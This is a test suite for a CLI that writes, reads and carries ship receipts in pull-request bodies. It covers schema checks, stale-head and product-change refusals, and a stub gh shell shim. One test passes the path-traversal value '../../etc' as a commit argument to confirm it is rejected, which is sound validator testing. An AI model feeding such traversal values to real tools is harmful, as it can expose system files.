/**
 * C5: the handoff record. `write` renders the fenced block identifiers-first
 * and places it at the top of a PR body; `read` parses it back from a body or
 * a PR (RECEIPT_MISSING / RECEIPT_INVALID); `census` computes the P7 adoption
 * number over merged PRs, deduplicated by run and thread, against a cohort.
 */
import { afterEach, describe, expect, test } from 'bun:test';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { EXIT } from '../lib/headless-artifacts';
import { bindReceipt, classifyCarryPath, computeCensus, extractReceipt, parseReviewLoop, placeReceiptFirst, planCarry, receiptSummaryLine, renderReceiptBlock, stampOnlyText } from '../lib/ship-receipt';
import { cleanup, ghShim, makeFixtureRepo, makePr, recordAndBundle, restamp, runBin, type FixtureRepo } from './helpers/restamp-fixture';

const repos: FixtureRepo[] = [];
const fixture = () => { const r = makeFixtureRepo({ prefix: 'ship-receipt-' }); repos.push(r); return r; };
afterEach(() => { while (repos.length) cleanup(repos.pop()!); });

const HEAD = 'a'.repeat(40);
const block = (receipt: Record<string, unknown>) => renderReceiptBlock(receipt as any);

describe('gstack-ship-receipt write', () => {
  test('writes the block identifiers-first, validates it against the ship-receipt schema, and puts it at the top of the PR body', () => {
    const repo = fixture();
    makePr(repo, 'pr-a', { expects: '1.2.4.0' });
    expect(restamp(repo, ['--version', '1.2.4.0']).status).toBe(EXIT.ok);
    repo.git('commit', '-qam', 'stamp');
    const head = repo.git('rev-parse', 'HEAD');
    const bundle = path.join(repo.root, 'bundle.json');
    recordAndBundle(repo, repo.work, [{ label: 'tests', command: 'true' }], bundle);
    const treeReceipt = path.join(repo.root, 'tree-receipt.json');
    const tr = runBin(repo, 'gstack-tree-receipt', ['--base', 'main', '--gated', head, '--bundle', bundle, '--predecessor', 'b'.repeat(40), '--json']);
    fs.writeFileSync(treeReceipt, tr.out);
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, '## Summary\n\nProse that a truncated message may lose.\n');
    const w = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '42', '--base', 'main', '--receipt', treeReceipt,
      '--gate', '{"tests":{"pass":1,"fail":0,"skip":0}}', '--ci', '@' + path.join(repo.root, 'ci.json'), '--spend-usd', '0.42',
      '--session-kind', 'unattended', '--artifacts-consumed', '2/3', '--run', 'run-1', '--thread', 'jam_1', '--queue-mode', 'stamp-at-merge',
      '--preregistration', 'none (no preregistration_shas)', '--history', 'squash-ok', '--body', body, '--out', path.join(repo.root, 'receipt.md')]);
    expect(w.status).toBe(EXIT.usage);
    fs.writeFileSync(path.join(repo.root, 'ci.json'), '{"checks":{"pass":3,"fail":0,"pending":0}}');
    const ok = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '42', '--base', 'main', '--receipt', treeReceipt,
      '--gate', '{"tests":{"pass":1,"fail":0,"skip":0}}', '--ci', '@' + path.join(repo.root, 'ci.json'), '--spend-usd', '0.42',
      '--session-kind', 'unattended', '--artifacts-consumed', '2/3', '--run', 'run-1', '--thread', 'jam_1', '--queue-mode', 'stamp-at-merge',
      '--preregistration', 'none (no preregistration_shas)', '--history', 'squash-ok', '--body', body, '--out', path.join(repo.root, 'receipt.md')]);
    expect(ok.status).toBe(EXIT.ok);
    expect(ok.err.trim()).toBe(`SHIP_RECEIPT: pr=42 head=${head.slice(0, 12)} version=1.2.4.0 base=main gated_tree=${repo.git('rev-parse', 'HEAD^{tree}').slice(0, 12)} tree=same-modulo-stamps gate-reuse=eligible (reusable: tests; rerun: -) predecessor=${'b'.repeat(12)} session_kind=unattended artifacts_consumed=2/3 depth=light`);
    const parsed = extractReceipt(ok.out);
    expect(parsed.found).toBe(true);
    expect(parsed.errors).toEqual([]);
    expect(Object.keys(parsed.receipt!)).toEqual(['schema_version', 'pr', 'head', 'version', 'base', 'gated_tree', 'predecessor', 'tree', 'gate_reuse', 'gate', 'ci', 'spend_usd', 'session_kind', 'artifacts_consumed', 'run', 'thread', 'policy', 'queue_mode', 'preregistration', 'history', 'head_tree', 'product_patch_id', 'gstack_version', 'review_depth']);
    expect(parsed.receipt).toMatchObject({ schema_version: 1, pr: 42, head, version: '1.2.4.0', base: 'main', tree: 'same-modulo-stamps', spend_usd: 0.42, ci: { checks: { pass: 3 } } });
    expect(parsed.receipt!.head_tree).toBe(repo.git('rev-parse', 'HEAD^{tree}'));
    expect(parsed.receipt!.product_patch_id).toMatch(/^([0-9a-f]{40}|none)$/);
    expect(parsed.receipt!.policy).toMatch(/^origin\/main@[0-9a-f]{12}:\.gstack\/ship-policy\.json$/);
    const written = fs.readFileSync(body, 'utf8');
    expect(written.startsWith('```gstack-ship-receipt\n{\n  "schema_version": 1,\n  "pr": 42,\n  "head": "' + head + '"')).toBe(true);
    expect(written).toContain('\n```\n\n## Summary\n\nProse that a truncated message may lose.\n');
    expect(fs.readFileSync(path.join(repo.root, 'receipt.md'), 'utf8')).toBe(ok.out);
    const art = runBin(repo, 'gstack-artifact', ['validate', path.join(repo.root, 'receipt.json'), '--as', 'ship-receipt']);
    expect(art.status).not.toBe(EXIT.ok);
    fs.writeFileSync(path.join(repo.root, 'receipt.json'), JSON.stringify(parsed.receipt));
    expect(runBin(repo, 'gstack-artifact', ['validate', path.join(repo.root, 'receipt.json'), '--as', 'ship-receipt']).status).toBe(EXIT.ok);
    const again = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '43', '--base', 'main', '--body', body, '--session-kind', 'interactive', '--json']);
    expect(again.status).toBe(EXIT.ok);
    const j = JSON.parse(again.out);
    expect(j).toMatchObject({ pr: 43, head, session_kind: 'interactive' });
    expect('tree' in j).toBe(false);
    const rewritten = fs.readFileSync(body, 'utf8');
    expect(rewritten.match(/```gstack-ship-receipt/g)).toHaveLength(1);
    expect(rewritten).toContain('"pr": 43');
    expect(rewritten).toContain('## Summary');
  });

  test('refuses an invalid receipt before writing (RECEIPT_INVALID) and a non-integer --pr', () => {
    const repo = fixture();
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, 'prose\n');
    const r = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', 'seven', '--base', 'main', '--session-kind', 'x', '--body', body]);
    expect(r.status).toBe(EXIT.usage);
    expect(r.err).toContain('--pr must be an integer');
    const receiptFile = path.join(repo.root, 'tree-receipt.json');
    fs.writeFileSync(receiptFile, JSON.stringify({ tree: 'sideways', gate_reuse: 'eligible', gate_reuse_reason: 'x' }));
    const inv = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '7', '--base', 'main', '--session-kind', 'x', '--receipt', receiptFile, '--body', body]);
    expect(inv.status).toBe(EXIT.fail);
    expect(inv.err).toMatch(/\(RECEIPT_INVALID\)/);
    expect(inv.err).toContain('nothing written');
    expect(fs.readFileSync(body, 'utf8')).toBe('prose\n');
  });
});

describe('gstack-ship-receipt read', () => {
  test('read --body and read --pr (through gh) return the block; a missing block is RECEIPT_MISSING, a broken one RECEIPT_INVALID', () => {
    const repo = fixture();
    const receipt = { schema_version: 1, pr: 5, head: HEAD, version: '1.2.4.0', base: 'main', session_kind: 'unattended', artifacts_consumed: '1/1', run: 'run-5', thread: 'jam_5' };
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, placeReceiptFirst('Prose.\n', receipt as any));
    const b = runBin(repo, 'gstack-ship-receipt', ['read', '--body', body, '--json']);
    expect(b.status).toBe(EXIT.ok);
    expect(JSON.parse(b.out)).toEqual(receipt);
    expect(b.err.trim()).toBe(receiptSummaryLine(receipt as any));
    const env = ghShim(repo, {
      5: { body: fs.readFileSync(body, 'utf8') },
      6: { body: 'No receipt here.\n' },
      7: { body: block({ schema_version: 2, head: HEAD, base: 'main' }) },
      8: { body: '```gstack-ship-receipt\n{not json\n```\n' },
    });
    const p = runBin(repo, 'gstack-ship-receipt', ['read', '--pr', '5', '--repo', 'o/r'], env);
    expect(p.status).toBe(EXIT.ok);
    expect(p.out).toBe(renderReceiptBlock(receipt as any));
    const missing = runBin(repo, 'gstack-ship-receipt', ['read', '--pr', '6', '--json'], env);
    expect(missing.status).toBe(EXIT.fail);
    expect(missing.err).toMatch(/PR #6.*\(RECEIPT_MISSING\)/);
    expect(JSON.parse(missing.out)).toEqual({ found: false, errors: [] });
    const invalid = runBin(repo, 'gstack-ship-receipt', ['read', '--pr', '7', '--json'], env);
    expect(invalid.status).toBe(EXIT.fail);
    expect(invalid.err).toMatch(/\(RECEIPT_INVALID\)/);
    expect(JSON.parse(invalid.out)).toMatchObject({ found: true, valid: false });
    const broken = runBin(repo, 'gstack-ship-receipt', ['read', '--pr', '8'], env);
    expect(broken.status).toBe(EXIT.fail);
    expect(broken.err).toMatch(/block is not JSON.*\(RECEIPT_INVALID\)/);
    expect(runBin(repo, 'gstack-ship-receipt', ['read', '--pr', '9'], env).status).toBe(EXIT.fail);
    expect(runBin(repo, 'gstack-ship-receipt', ['read']).status).toBe(EXIT.usage);
  });

  test('the unattended handoff write lands in the file docs/unattended.md tells the parent to read --body, at HEAD and with no pr (GSTA-88)', () => {
    const root = path.resolve(import.meta.dir, '..');
    const tmpl = fs.readFileSync(path.join(root, 'ship/sections/handoff.md.tmpl'), 'utf8');
    const write = tmpl.match(/gstack-ship-receipt (write [^\n`]*)/)![1].trim();
    const out = write.match(/--out (\S+)/)?.[1];
    expect(out).toBe('.gstack/tmp/ship-receipt.md');
    expect(fs.readFileSync(path.join(root, 'ship/sections/handoff.md'), 'utf8')).toContain(write);
    const docs = fs.readFileSync(path.join(root, 'docs/unattended.md'), 'utf8').replace(/\s+/g, ' ');
    expect(docs).toContain(`gstack-ship-receipt read --body ${out} --json`);
    expect(docs).toMatch(/read --pr <n> --json` only once a PR exists/);

    const repo = fixture();
    const env = { GSTACK_SESSION_KIND: 'unattended' };
    fs.mkdirSync(path.join(repo.work, '.gstack/tmp'), { recursive: true });
    fs.writeFileSync(path.join(repo.work, '.gstack/tmp/ship-gate.json'), '{"free":{"pass":1,"fail":0,"skip":0}}');
    expect(runBin(repo, 'gstack-issue-links', ['--base', 'main', '--out', '.gstack/tmp/issues.json'], env).status).toBe(EXIT.ok);
    const w = runBin(repo, 'gstack-ship-receipt', write.replace('<base>', 'main').split(' '), env);
    expect(w.status).toBe(EXIT.ok);
    expect(fs.readFileSync(path.join(repo.work, out!), 'utf8')).toBe(w.out);
    const r = runBin(repo, 'gstack-ship-receipt', ['read', '--body', out!, '--json'], env);
    expect(r.status).toBe(EXIT.ok);
    const receipt = JSON.parse(r.out);
    expect(receipt).toMatchObject({ head: repo.git('rev-parse', 'HEAD'), base: 'main', session_kind: 'unattended' });
    expect(receipt).not.toHaveProperty('pr');
  });
});

describe('gstack-ship-receipt result (/ship terminal line, GBRA-108)', () => {
  test('binds the receipt to HEAD, writes the run record with the head and the receipt path, and ends with GSTACK_RESULT: skill=ship; a missing or stale receipt is status=refused run=-', () => {
    const repo = fixture();
    const head = repo.git('rev-parse', 'HEAD');
    const state = path.join(repo.root, 'state');
    const env = { ...ghShim(repo, {
      5: { headRefOid: head, body: placeReceiptFirst('Prose.\n', { schema_version: 1, pr: 5, head, base: 'main', queue_mode: 'stamp-at-merge' } as any) },
      6: { headRefOid: head, body: placeReceiptFirst('Prose.\n', { schema_version: 1, pr: 6, head: 'b'.repeat(40), base: 'main' } as any) },
      7: { headRefOid: head, body: 'No receipt here.\n' },
      9: { headRefOid: 'd'.repeat(40), body: placeReceiptFirst('Prose.\n', { schema_version: 1, pr: 9, head, base: 'main' } as any) },
      10: { body: placeReceiptFirst('Prose.\n', { schema_version: 1, pr: 10, head, base: 'main' } as any) },
    }), GSTACK_STATE_ROOT: state, GSTACK_SESSION_KIND: 'unattended' };
    const ok = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '5'], env);
    expect(ok.status).toBe(EXIT.ok);
    const last = ok.out.trim().split('\n').at(-1)!;
    const m = /^GSTACK_RESULT: skill=ship status=complete run=(.+)$/.exec(last);
    expect(m).not.toBeNull();
    const dir = m![1]!;
    expect(dir.startsWith(path.join(state, 'ship', 'runs'))).toBe(true);
    expect(dir.endsWith(`-${head.slice(0, 12)}`)).toBe(true);
    const run = JSON.parse(fs.readFileSync(path.join(dir, 'ship-run.json'), 'utf8'));
    expect(fs.existsSync(path.join(dir, 'run.json'))).toBe(false);
    expect(run).toMatchObject({ schema_version: 1, skill: 'ship', status: 'complete', head, pr: 5, base: 'main', queue_mode: 'stamp-at-merge', receipt: path.join(dir, 'ship-receipt.md'), receipt_source: 'PR #5' });
    expect(extractReceipt(fs.readFileSync(run.receipt, 'utf8')).receipt).toMatchObject({ pr: 5, head });
    expect(ok.err.trim()).toBe(`SHIP_RECEIPT: pr=5 head=${head.slice(0, 12)} version=- base=main`);

    const stale = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '6'], env);
    expect(stale.status).toBe(EXIT.refused);
    expect(stale.out.trim()).toBe('GSTACK_RESULT: skill=ship status=refused run=-');
    expect(stale.err).toMatch(new RegExp(`PR #6's ship receipt is for bbbbbbbbbbbb, not the head ${head.slice(0, 12)} being merged.*\\(QUEUE_RECEIPT_STALE; https://github.com/garrytan/gstack/blob/main/docs/troubleshooting.md#queue-receipt-stale\\)`));
    const missing = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '7', '--json'], env);
    expect(missing.status).toBe(EXIT.refused);
    expect(JSON.parse(missing.out)).toMatchObject({ skill: 'ship', status: 'refused', run: '-', code: 'QUEUE_RECEIPT_MISSING' });
    const unpushed = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '9'], env);
    expect([unpushed.status, unpushed.out.trim()]).toEqual([EXIT.refused, 'GSTACK_RESULT: skill=ship status=refused run=-']);
    expect(unpushed.err).toContain(`HEAD ${head.slice(0, 12)} is not PR #9's pushed head dddddddddddd; push it, then rerun gstack-ship-receipt result`);
    const noOid = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '10'], env);
    expect([noOid.status, noOid.out.trim()]).toEqual([EXIT.fail, 'GSTACK_RESULT: skill=ship status=incomplete run=-']);
    expect(noOid.err).toContain('gh pr view returned no headRefOid for PR #10');
    expect(runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '--repo'], env).status).toBe(EXIT.usage);
    const bothFlags = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '5', '--body', path.join(repo.work, 'any.md')], env);
    expect([bothFlags.status, bothFlags.out]).toEqual([EXIT.usage, '']);
    expect(bothFlags.err).toContain('not both');
    const dirBody = runBin(repo, 'gstack-ship-receipt', ['result', '--body', repo.work], env);
    expect([dirBody.status, dirBody.out.trim()]).toEqual([EXIT.fail, 'GSTACK_RESULT: skill=ship status=incomplete run=-']);
    expect(dirBody.err).toContain(`cannot read ${repo.work}`);

    const bodyFile = path.join(repo.work, '.gstack/tmp/ship-receipt.md');
    fs.mkdirSync(path.dirname(bodyFile), { recursive: true });
    fs.writeFileSync(bodyFile, renderReceiptBlock({ schema_version: 1, head, base: 'main' } as any));
    const handoff = runBin(repo, 'gstack-ship-receipt', ['result', '--body', bodyFile, '--out', path.join(repo.root, 'run-out')], env);
    expect(handoff.status).toBe(EXIT.ok);
    expect(handoff.out.trim()).toBe(`GSTACK_RESULT: skill=ship status=complete run=${path.join(repo.root, 'run-out')}`);
    expect(JSON.parse(fs.readFileSync(path.join(repo.root, 'run-out', 'ship-run.json'), 'utf8'))).toMatchObject({ head, pr: null, receipt_source: bodyFile, session_kind: 'unattended' });
    expect(runBin(repo, 'gstack-ship-receipt', ['result', '--body', path.join(repo.root, 'absent.md')], env).status).toBe(EXIT.refused);
    expect(runBin(repo, 'gstack-ship-receipt', ['result'], env).status).toBe(EXIT.usage);
    const relative = runBin(repo, 'gstack-ship-receipt', ['result', '--body', bodyFile, '--out', 'rel-out'], env);
    expect(relative.status).toBe(EXIT.ok);
    expect(relative.out.trim()).toBe(`GSTACK_RESULT: skill=ship status=complete run=${path.join(repo.work, 'rel-out')}`);
    expect(fs.existsSync(path.join(repo.work, 'rel-out', 'ship-run.json'))).toBe(true);
    const blocker = path.join(repo.root, 'not-a-dir');
    fs.writeFileSync(blocker, 'file\n');
    const unwritable = runBin(repo, 'gstack-ship-receipt', ['result', '--body', bodyFile, '--out', path.join(blocker, 'sub')], env);
    expect([unwritable.status, unwritable.out.trim()]).toEqual([EXIT.fail, 'GSTACK_RESULT: skill=ship status=incomplete run=-']);
    expect(unwritable.err).toContain(`cannot write the run record under ${path.join(blocker, 'sub')}`);
    expect(fs.readdirSync(path.join(state, 'ship', 'runs')).length).toBe(1);
  });

  // Value: protects=a --body handoff refusal names "the receipt", never "PR #-", and a gh failure is EXIT.fail, not a refusal;
  // fails_when=the PR #-'s rewrite stops matching or gh errors are mapped to status=refused; why_new=the result test covers
  // only the --pr refusals, an absent file and a bound handoff; seam=none; no_claim=real gh (the shim stands in; unit only)
  test('a --body file with no block or a stale head is refused in the receipt\'s own words, and a gh failure is a plain failure, not a refusal', () => {
    const repo = fixture();
    const head = repo.git('rev-parse', 'HEAD');
    const env = { ...ghShim(repo, {}), GSTACK_STATE_ROOT: path.join(repo.root, 'state') };
    const dir = path.join(repo.work, '.gstack/tmp');
    fs.mkdirSync(dir, { recursive: true });
    const noBlock = path.join(dir, 'no-block.md');
    fs.writeFileSync(noBlock, 'Handoff prose without a receipt.\n');
    const missing = runBin(repo, 'gstack-ship-receipt', ['result', '--body', noBlock], env);
    expect(missing.status).toBe(EXIT.refused);
    expect(missing.out.trim()).toBe('GSTACK_RESULT: skill=ship status=refused run=-');
    expect(missing.err).toContain("the receipt's body carries no ship receipt");
    expect(missing.err).not.toContain('PR #-');
    const staleFile = path.join(dir, 'stale.md');
    fs.writeFileSync(staleFile, renderReceiptBlock({ schema_version: 1, head: 'c'.repeat(40), base: 'main' } as any));
    const stale = runBin(repo, 'gstack-ship-receipt', ['result', '--body', staleFile], env);
    expect(stale.status).toBe(EXIT.refused);
    expect(stale.err).toContain(`the receipt's ship receipt is for cccccccccccc, not the head ${head.slice(0, 12)} being merged`);
    const invalidFile = path.join(dir, 'invalid.md');
    fs.writeFileSync(invalidFile, '```gstack-ship-receipt\n{"schema_version":1}\n```\n');
    const invalid = runBin(repo, 'gstack-ship-receipt', ['result', '--body', invalidFile], env);
    expect([invalid.status, invalid.out.trim()]).toEqual([EXIT.refused, 'GSTACK_RESULT: skill=ship status=refused run=-']);
    expect(invalid.err).toMatch(/the receipt's ship receipt is invalid \(.*\).*\(QUEUE_RECEIPT_MISSING/);
    const otherPrEnv = { ...env, ...ghShim(repo, { 8: { headRefOid: head, body: placeReceiptFirst('Prose.\n', { schema_version: 1, pr: 99, head, base: 'main' } as any) } }) };
    const otherPr = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '8'], otherPrEnv);
    expect([otherPr.status, otherPr.out.trim()]).toEqual([EXIT.refused, 'GSTACK_RESULT: skill=ship status=refused run=-']);
    expect(otherPr.err).toContain("PR #8's ship receipt names pr=99, not this PR");
    const pinned = path.join(dir, 'pinned.md');
    fs.writeFileSync(pinned, renderReceiptBlock({ schema_version: 1, head: 'c'.repeat(40), base: 'main' } as any));
    const override = runBin(repo, 'gstack-ship-receipt', ['result', '--body', pinned, '--head', 'c'.repeat(40), '--out', path.join(repo.root, 'pinned-out')], env);
    expect([override.status, override.out.trim()]).toEqual([EXIT.ok, `GSTACK_RESULT: skill=ship status=complete run=${path.join(repo.root, 'pinned-out')}`]);
    expect(JSON.parse(fs.readFileSync(path.join(repo.root, 'pinned-out', 'ship-run.json'), 'utf8')).head).toBe('c'.repeat(40));
    const badHead = runBin(repo, 'gstack-ship-receipt', ['result', '--body', pinned, '--head', '../../etc'], env);
    expect([badHead.status, badHead.out]).toEqual([EXIT.usage, '']);
    expect(badHead.err).toContain('--head must be a full hex commit id');
    const shortHead = runBin(repo, 'gstack-ship-receipt', ['result', '--body', pinned, '--head', head.slice(0, 12)], env);
    expect([shortHead.status, shortHead.out]).toEqual([EXIT.usage, '']);
    expect(shortHead.err).toContain('--head must be a full hex commit id');
    const upper = runBin(repo, 'gstack-ship-receipt', ['result', '--body', pinned, '--head', 'C'.repeat(40), '--out', path.join(repo.root, 'upper-out')], env);
    expect([upper.status, upper.out.trim()]).toEqual([EXIT.ok, `GSTACK_RESULT: skill=ship status=complete run=${path.join(repo.root, 'upper-out')}`]);
    const noGit = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-receipt-nogit-'));
    const outside = runBin(repo, 'gstack-ship-receipt', ['result', '--body', pinned], env, noGit);
    expect([outside.status, outside.err.trim()]).toEqual([EXIT.usage, 'gstack-ship-receipt result: --head <sha> is required outside a git repository']);
    fs.rmSync(noGit, { recursive: true, force: true });
    const ghDown = runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '9'], env);
    expect(ghDown.status).toBe(EXIT.fail);
    expect(ghDown.err).toContain('gh pr view failed');
    expect(ghDown.out.trim()).toBe('GSTACK_RESULT: skill=ship status=incomplete run=-');
    expect(JSON.parse(runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '9', '--json'], env).out)).toMatchObject({ skill: 'ship', status: 'incomplete', run: '-' });
    expect(fs.existsSync(path.join(repo.root, 'state', 'ship', 'runs'))).toBe(false);
  });
});

describe('gstack-ship-receipt carry (harness lane E row 3: receipt follows a head whose product diff is unchanged)', () => {
  // Value: protects=the carry rebinds only when the product patch-id against the base is identical (base merge, test-only fix,
  // release metadata), records the evidence, and refuses a product change by name; fails_when=a product edit is carried, a
  // rebased head is accepted, or the carried receipt loses its SHIP_RECEIPT identity; seam=none; no_claim=gh pr edit (the shim stands in)
  test('carries across a conflict-only base merge and a test-only fix, records the carry, and ends with the terminal line; a product change is RECEIPT_CARRY_PRODUCT_CHANGED', () => {
    const repo = fixture();
    fs.mkdirSync(path.join(repo.work, 'src'), { recursive: true });
    fs.mkdirSync(path.join(repo.work, 'test'), { recursive: true });
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 1;\n');
    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 1;\n');
    fs.writeFileSync(path.join(repo.work, 'test', 'app.test.ts'), 'test a\n');
    repo.git('add', '.'); repo.git('commit', '-qm', 'seed app'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-qb', 'feat');
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 2;\n');
    repo.git('commit', '-qam', 'feat: a=2');
    const reviewed = repo.git('rev-parse', 'HEAD');
    // main moves on in another file; the branch merges it (conflict-only base merge).
    repo.git('checkout', '-q', 'main');
    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 2;\n');
    repo.git('commit', '-qam', 'main: o=2'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-q', 'feat');
    repo.git('merge', '-q', '--no-edit', 'origin/main');
    // then a test-only fix
    fs.writeFileSync(path.join(repo.work, 'test', 'app.test.ts'), 'test a=2\n');
    repo.git('commit', '-qam', 'test: fix expectation');
    const head = repo.git('rev-parse', 'HEAD');
    const state = path.join(repo.root, 'state');
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 5, head: reviewed, base: 'main', queue_mode: 'stamp-at-merge', review_loop: { passes: 2, blocking_found: 1, deferred: 1 } } as any));
    const env = { GSTACK_STATE_ROOT: state, GSTACK_SESSION_KIND: 'unattended' };
    const dry = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
    expect(dry.status).toBe(EXIT.ok);
    expect(dry.out.trim()).toBe(`CARRY: would carry from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (base merge + test-only change); nothing written`);
    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(reviewed);
    const carried = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--out', path.join(repo.root, 'carry-run')], env);
    expect(carried.status).toBe(EXIT.ok);
    expect(carried.out.trim().split('\n')).toEqual([
      `CARRY: carried from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (base merge + test-only change)`,
      `GSTACK_RESULT: skill=ship status=complete run=${path.join(repo.root, 'carry-run')}`,
    ]);
    expect(carried.err.trim()).toBe(`SHIP_RECEIPT: pr=5 head=${head.slice(0, 12)} version=- base=main passes=2 blocking_found=1 deferred=1 carried_from=${reviewed.slice(0, 12)}`);
    const after = extractReceipt(fs.readFileSync(body, 'utf8'));
    expect(after.errors).toEqual([]);
    expect(after.receipt).toMatchObject({ pr: 5, head, base: 'main', review_loop: { passes: 2 } });
    expect(after.receipt!.carry).toMatchObject({ from: reviewed, reason: 'base merge + test-only change', merge_commits: 1, covers: ['pre-landing review', 'adversarial review', 'gate integrity', 'documentation audit'] });
    expect(after.receipt!.carry!.product_patch_id).toMatch(/^[0-9a-f]{40}$/);
    expect(after.receipt!.carry!.changed_paths.sort()).toEqual(['product:src/other.ts', 'test:test/app.test.ts']);
    expect(after.receipt!.carry!.range_diff).not.toMatch(/^unavailable/);
    expect(fs.readFileSync(body, 'utf8')).toContain('\n## Summary\n\nProse.\n');
    const run = JSON.parse(fs.readFileSync(path.join(repo.root, 'carry-run', 'ship-run.json'), 'utf8'));
    expect(run).toMatchObject({ skill: 'ship', status: 'complete', head, pr: 5, carried_from: reviewed, carry_reason: 'base merge + test-only change' });
    expect(bindReceipt(fs.readFileSync(body, 'utf8'), '5', [head]).ok).toBe(true);
    // already current
    const current = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env);
    expect([current.status, current.out.trim()]).toEqual([EXIT.ok, `CARRY: current (the receipt already names ${head.slice(0, 12)})`]);
    // a product change does not carry, and the body keeps the receipt it had
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 3;\n');
    repo.git('commit', '-qam', 'feat: a=3');
    const changed = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env);
    expect(changed.status).toBe(EXIT.refused);
    expect(changed.out.trim()).toBe('CARRY: refused (RECEIPT_CARRY_PRODUCT_CHANGED)\nGSTACK_RESULT: skill=ship status=refused run=-');
    expect(changed.err).toContain(`product diff changed between ${head.slice(0, 12)} and ${repo.git('rev-parse', 'HEAD').slice(0, 12)}: src/app.ts`);
    expect(changed.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED; https://github.com/garrytan/gstack/blob/main/docs/troubleshooting.md#receipt-carry-product-changed)');
    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(head);
  });

  test('a rebased head (receipt head not an ancestor), a body without a receipt and another PR\'s receipt are refused; through gh the body is posted with gh pr edit', () => {
    const repo = fixture();
    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'a\n');
    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-qb', 'feat');
    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'b\n');
    repo.git('commit', '-qam', 'feat');
    const reviewed = repo.git('rev-parse', 'HEAD');
    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state') };
    const foreign = path.join(repo.root, 'foreign.md');
    fs.writeFileSync(foreign, placeReceiptFirst('x\n', { schema_version: 1, pr: 5, head: 'c'.repeat(40), base: 'main' } as any));
    repo.git('commit', '-q', '--allow-empty', '-m', 'empty follow-up');
    const notAncestor = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', foreign], env);
    expect(notAncestor.status).toBe(EXIT.refused);
    expect(notAncestor.err).toContain('is not an ancestor of HEAD');
    expect(notAncestor.err).toContain('(RECEIPT_CARRY_REFUSED;');
    const none = path.join(repo.root, 'none.md');
    fs.writeFileSync(none, 'No receipt.\n');
    expect(runBin(repo, 'gstack-ship-receipt', ['carry', '--body', none], env).err).toContain('(QUEUE_RECEIPT_MISSING;');
    expect(runBin(repo, 'gstack-ship-receipt', ['carry'], env).status).toBe(EXIT.usage);
    expect(runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '5', '--body', none], env).status).toBe(EXIT.usage);
    // through gh: the shim records the edit
    const head = repo.git('rev-parse', 'HEAD');
    const shimDir = path.join(repo.root, 'gh2');
    fs.mkdirSync(shimDir);
    const posted = path.join(shimDir, 'posted.md');
    const prBody = placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 8, head: reviewed, base: 'main' } as any);
    fs.writeFileSync(path.join(shimDir, 'pr.json'), JSON.stringify({ body: prBody, headRefOid: head }));
    fs.writeFileSync(path.join(shimDir, 'gh'), [
      '#!/bin/sh',
      `if [ "$1" = pr ] && [ "$2" = view ]; then cat "${path.join(shimDir, 'pr.json')}"; exit 0; fi`,
      `if [ "$1" = pr ] && [ "$2" = edit ]; then shift 3; [ "$1" = --body-file ] || exit 9; cp "$2" "${posted}"; exit 0; fi`,
      'echo "unsupported $*" >&2; exit 1', '',
    ].join('\n'), { mode: 0o755 });
    const viaGh = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', path.join(repo.root, 'run')], { ...env, PATH: `${shimDir}:${process.env.PATH}` });
    expect(viaGh.status).toBe(EXIT.ok);
    expect(viaGh.out).toContain(`CARRY: carried from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (no content change)`);
    const postedReceipt = extractReceipt(fs.readFileSync(posted, 'utf8'));
    expect(postedReceipt.receipt).toMatchObject({ pr: 8, head, carry: { from: reviewed, reason: 'no content change', merge_commits: 0 } });
    expect(fs.readFileSync(posted, 'utf8')).toContain('## Summary\n\nProse.\n');
    const other = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '9'], { ...env, PATH: `${shimDir}:${process.env.PATH}` });
    expect(other.status).toBe(EXIT.refused);
    expect(other.err).toContain('the receipt names pr=8, not this PR');
  });

